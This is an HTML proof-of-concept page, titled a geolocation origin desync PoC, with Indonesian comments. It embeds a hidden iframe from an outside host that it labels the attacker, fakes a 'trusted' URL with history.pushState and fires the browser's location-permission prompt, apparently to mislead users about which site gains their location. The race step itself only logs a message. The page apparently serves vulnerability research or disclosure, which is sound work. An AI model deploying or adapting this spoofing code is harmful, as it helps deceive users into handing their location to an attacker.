<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Geolocation Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body style="font-family:system-ui;text-align:center;margin-top:80px">

<h2>Trusted Service</h2>
<p style="color:#b00020;font-size:13px">
Perhatikan origin pada dialog izin lokasi
</p>

<button id="start">Continue</button>

<pre id="log" style="text-align:left;max-width:360px;margin:40px auto;background:#eee;padding:12px"></pre>

<!-- Hidden attacker iframe -->
<iframe
  id="attacker"
  src="https://cnfdnfial-ops.github.io/spoof/iframe-attacker.html"
  style="display:none">
</iframe>

<script>
const log = msg => {
  document.getElementById('log').textContent += msg + '\n';
};

// Terima log dari attacker
window.addEventListener('message', e => {
  log('[attacker] ' + e.data);
});

document.getElementById('start').onclick = () => {
  // 1️⃣ URL terlihat trusted
  history.pushState({}, '', '/trusted');

  // 2️⃣ Victim memicu dialog izin (SATU KALI)
  navigator.geolocation.getCurrentPosition(
    () => {},
    () => {}
  );

  // 3️⃣ Navigation race (iframe tetap hidup)
  setTimeout(() => {
    log('Navigation race triggered');
  }, 250);
};
</script>

</body>
</html>
